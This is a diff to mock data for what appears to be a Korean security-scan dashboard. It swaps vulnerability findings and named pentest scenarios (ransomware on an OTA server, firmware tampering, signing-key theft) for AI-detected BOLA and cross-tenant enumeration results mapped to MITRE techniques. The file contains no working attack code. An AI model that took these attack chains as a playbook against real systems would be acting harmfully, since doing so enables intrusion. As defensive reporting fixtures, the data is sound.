-  { id: "INV-042", severity: "High", description: "DMZ→DB 직접 통신 허용", server_zone: "DMZ", type: "네트워크", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1021", weight: 7, detected_at: "2025-05-15T11:21:15Z", invariant_source: "fixed" },
-  { id: "INV-007", severity: "High", description: "펌웨어 업데이트 서명 검증 누락", server_zone: "배포", type: "보안정책", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1195", weight: 7, detected_at: "2025-05-15T11:21:22Z", invariant_source: "variable" },
-  { id: "INV-055", severity: "Medium", description: "고객 영상 데이터 암호화 미적용", server_zone: "DB", type: "보안정책", attack_phase: "데이터탈취", mitre_tactic: "TA0010", mitre_technique: "T1048", weight: 4, detected_at: "2025-05-15T11:21:31Z", invariant_source: "variable" },
-  { id: "INV-012", severity: "Medium", description: "관리자 페이지 IP 제한 미설정", server_zone: "운영", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1190", weight: 4, detected_at: "2025-05-15T11:21:45Z", invariant_source: "fixed" },
-  { id: "INV-029", severity: "Medium", description: "SSH 기본 포트 사용", server_zone: "관리", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1110", weight: 4, detected_at: "2025-05-15T11:22:01Z", invariant_source: "fixed" },
-  { id: "INV-038", severity: "Low", description: "로그 보관 기간 30일 미만", server_zone: "백업", type: "보안정책", attack_phase: "내부이동", mitre_tactic: "TA0005", mitre_technique: "T1070", weight: 1, detected_at: "2025-05-15T11:22:15Z", invariant_source: "variable" },
-  { id: "INV-044", severity: "Low", description: "개발 서버 불필요한 포트 오픈", server_zone: "개발", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1046", weight: 1, detected_at: "2025-05-15T11:22:30Z", invariant_source: "variable" },
-  { id: "INV-061", severity: "High", description: "디바이스 인증서 만료 검증 누락", server_zone: "운영", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1134", weight: 7, detected_at: "2025-05-15T11:22:45Z", invariant_source: "fixed" },
-  // SCAN-0047에서 조치 완료된 취약점들
-  { id: "INV-073", severity: "Critical", description: "개발 서버 SSH 루트 로그인 허용", server_zone: "개발", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1078", weight: 10, detected_at: "2025-05-15T11:23:00Z", invariant_source: "fixed" },
-  { id: "INV-074", severity: "High", description: "방화벽 정책 과도한 Any-Any 규칙 존재", server_zone: "DMZ", type: "네트워크", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1021", weight: 7, detected_at: "2025-05-15T11:23:15Z", invariant_source: "fixed" },
-  { id: "INV-075", severity: "Medium", description: "로그인 실패 임계값 미설정", server_zone: "운영", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1110", weight: 4, detected_at: "2025-05-15T11:23:30Z", invariant_source: "variable" },
-  { id: "INV-076", severity: "Low", description: "미사용 서비스 포트 노출 (TCP 8080)", server_zone: "배포", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1046", weight: 1, detected_at: "2025-05-15T11:23:45Z", invariant_source: "variable" },
-  { id: "INV-077", severity: "Low", description: "세션 타임아웃 미설정 (관리자 콘솔)", server_zone: "운영", type: "보안정책", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1078", weight: 1, detected_at: "2025-05-15T11:24:00Z", invariant_source: "variable" },
-];
-
-const pentestResults_0046 = [
+  ...violations,
   {
-    scenario_id: "PT-001", chain_id: "CHAIN-001",
-    title: "서명키 탈취 및 악성 OTA 배포", result: "partial",
-    phases: [
-      { phase: "초기침투", success: true,  detected: false, method: "익명 OTA 접근" },
-      { phase: "내부이동", success: true,  detected: true,  method: "DMZ-DB 직통 (일부 차단)" },
-      { phase: "권한상승", success: false, detected: true,  method: "SSH 루트 차단됨" },
-      { phase: "데이터탈취", success: false, detected: false, method: "미도달" },
-    ],
+    result_id: "ai1-result-008", invariant_id: "INV-STD-07", confidence: 0.93,
+    evidence_ids: ["evd-api-008"], asset_ids: ["device-10000003"],
+    status: "violated", violation_reason: "clear_violation",
+    summary: "deviceId 변경 요청에서 타 고객 기기 정보가 반환되어 BOLA 불변식이 위반됨.",
+    reason: "token_sub=customer_a인데 deviceId=device-10000003(owner: customer_c)의 정보가 200 OK로 반환됨.",
+    current_environment_testable: true, testability_reason: "기기 목록 API에서 deviceId를 변경해 확인 가능.",
+    created_at: "2025-05-15T11:21:03Z",
+    id: "INV-STD-07", severity: "Critical", description: "BOLA — 객체 단위 인가 검증 실패 탐지",
+    server_zone: "운영", type: "접근제어", attack_phase: "데이터탈취",
+    mitre_tactic: "TA0010", mitre_technique: "T1213", weight: 10, invariant_source: "fixed",
+    detected_at: "2025-05-15T11:21:03Z", remediation: "모든 API 엔드포인트에 객체 소유권 검증 로직 추가", priority: "즉시",
   },
   {
-    scenario_id: "PT-002", chain_id: "CHAIN-002",
-    title: "고객 영상 데이터 무단 수집", result: "partial",
-    phases: [
-      { phase: "초기침투", success: true,  detected: false, method: "웹캠 API 취약점" },
-      { phase: "내부이동", success: true,  detected: true,  method: "내부망 스캔" },
-      { phase: "권한상승", success: false, detected: true,  method: "MFA 차단됨" },
-      { phase: "데이터탈취", success: false, detected: false, method: "미도달" },
-    ],
-  },
-  {
-    scenario_id: "PT-003", chain_id: "CHAIN-003",
-    title: "OTA 서버 랜섬웨어 투입", result: "success",
-    phases: [
-      { phase: "초기침투", success: true, detected: false, method: "스피어 피싱" },
-      { phase: "내부이동", success: true, detected: false, method: "내부망 횡이동" },
-      { phase: "권한상승", success: true, detected: false, method: "로컬 권한 상승" },
-      { phase: "데이터탈취", success: true, detected: false, method: "랜섬웨어 배포" },
-    ],
-  },
-  {
-    scenario_id: "PT-004", chain_id: "CHAIN-004",
-    title: "펌웨어 변조 후 디바이스 장악", result: "fail",
-    phases: [
-      { phase: "초기침투", success: true,  detected: true,  method: "스피어 피싱" },
-      { phase: "내부이동", success: false, detected: true,  method: "세그멘테이션 차단" },
-      { phase: "권한상승", success: false, detected: false, method: "미도달" },
-      { phase: "데이터탈취", success: false, detected: false, method: "미도달" },
-    ],
+    result_id: "ai1-result-009", invariant_id: "INV-ARG-06", confidence: 0.81,
+    evidence_ids: ["evd-aggregation-001"], asset_ids: ["customer_a"],
+    status: "violated", violation_reason: "clear_violation",
+    summary: "동일 actor가 60초 내 20개 이상의 서로 다른 테넌트 리소스를 순회하는 패턴이 탐지됨.",
+    reason: "customer_a가 60초 내 distinct_tenant_count=5, distinct_device_count=23 조회.",
+    current_environment_testable: true, testability_reason: "자동 순회 스크립트로 재현 가능.",
+    created_at: "2025-05-15T11:22:00Z",
+    id: "INV-ARG-06", severity: "Critical", description: "단일 주체의 비정상적인 다수 테넌트/디바이스 순회",
+    server_zone: "운영", type: "접근제어", attack_phase: "내부이동",
+    mitre_tactic: "TA0008", mitre_technique: "T1021", weight: 10, invariant_source: "fixed",
+    detected_at: "2025-05-15T11:22:00Z", remediation: "이상 접근 패턴 실시간 탐지 및 자동 세션 차단 도입", priority: "즉시",
   },
 ];
 
@@ -521,7 +507,7 @@ export const scanDetails = {
     ],
     attackChains,
     mitreMapping,
-    pentestResults: pentestResults_0046,
+    pentestResults: [],
     coverage: {
       초기침투: { total_weight: 29, violated_weight: 20, coverage_pct: 31 },
       내부이동: { total_weight: 25, violated_weight: 21, coverage_pct: 16 },
